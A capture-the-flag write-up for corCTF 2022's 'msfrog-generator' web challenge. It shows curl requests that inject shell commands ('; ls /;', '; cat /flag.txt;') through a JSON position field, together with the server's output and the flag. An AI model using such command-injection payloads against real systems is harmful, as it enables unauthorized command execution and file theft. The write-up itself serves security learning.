---
tags: writeup, corctf2022
---
# Writeup - web/msfrog-generator
## Challenge
Author: jazzpizazz
The vanilla msfrog is hard to beat, but this webapp allows you to make it even better!
## Solution
Opening up the site we see a canvas and some items to add to it and a button download it.
Looking at the source i see a javascript file     `/static/js/main.88f9e0db.js` and a comment:
```!
<!-- NOTE: There is no (intended) vuln in the frontend, please don't waste your time digging into the JS ;)  -->
```
Having read the comment I still decied to check out the js file which was heavily minified. At the end of the file I notice another comment:
```
//# sourceMappingURL=main.88f9e0db.js.map
```
A quick google search up later I find this info about the extension:
```!
From https://stackoverflow.com/questions/21719562/how-can-i-use-javascript-source-maps-map-files

The .map files are for JavaScript and CSS (and now TypeScript too)  files that have been minified.
What is it for?     To de-reference uglified code
Chrome: Open dev-tools, navigate to Sources tab. You will see the sources folder, where un-minified applications files are kept.
```
And sure enough opening dev tools->sources all the js files are visible. Looking through them trying to find something useful I find a file which includes an api call to generate the image `static->js->components->MsButton->MsButton.js`
```
let jsonData = [];
    placedItems.forEach((item) => {
      jsonData.push({ type: item.type, pos: item.pos });
    });

    try {
      let response = await fetch("/api/generate", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(jsonData),
      });
      if (response.status !== 200)
        throw `Unexpected response: ${response.status}`;
      response = await response.json();
      if (!response.msfrog) throw "Empty response, the heck?";
      toast.success("Enjoy your MsFrog :D");
      triggerBase64Download(
        `data:image/png;base64,${response.msfrog}`,
        "msfrog"
      );
    } catch (e) {
      toast.error(`Sadge, something went wrong: ${e}`);
    }
```
I set breakpoints to view jsonData:
`[{"type":"mstongue.png","pos":{"x":0,"y":0}}]`
At this point I got a bit stuck, but later while fuzzing with the data I got this:
```!
> curl -X POST https://msfrog-generator.be.ax/api/generate -d '[{"type":"lol","pos":{"x":0,"y":0}}]' -H "Content-Type: application/json"

I wont pass a non existing image to a shell command lol
```
Trying to inject some commands in the "type" value didn't work, so then I tried the pos values:
```!
> curl -X POST https://msfrog-generator.be.ax/api/generate -d '[{"type":"mstongue.png","pos":{"x":0,"y":"; ls;"}}]' -H "Content-Type: application/json"

{"msfrog": "fe\nimg\nserver.py\nwsgi.py\n"}
```
```!
> curl -X POST https://msfrog-generator.be.ax/api/generate -d '[{"type":"mstongue.png","pos":{"x":0,"y":"; ls /;"}}]' -H "Content-Type: application/json"

{"msfrog": "app\nbin\nboot\ndev\netc\nflag.txt\nhome\nlib\nlib32\nlib64\nlibx32\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n"}
```
Then just cat the flag
```!
> curl -X POST https://msfrog-generator.be.ax/api/generate -d '[{"type":"mstongue.png","pos":{"x":0,"y":"; cat /flag.txt;"}}]' -H "Content-Type: application/json"

{"msfrog": "corctf{sh0uld_h4ve_r3nder3d_cl13nt_s1de_:msfrog:}\n"}
```
## Flag
corctf{sh0uld_h4ve_r3nder3d_cl13nt_s1de_:msfrog:}
## Thoughts
This was kind of an interesting chall, but I think it was too guessy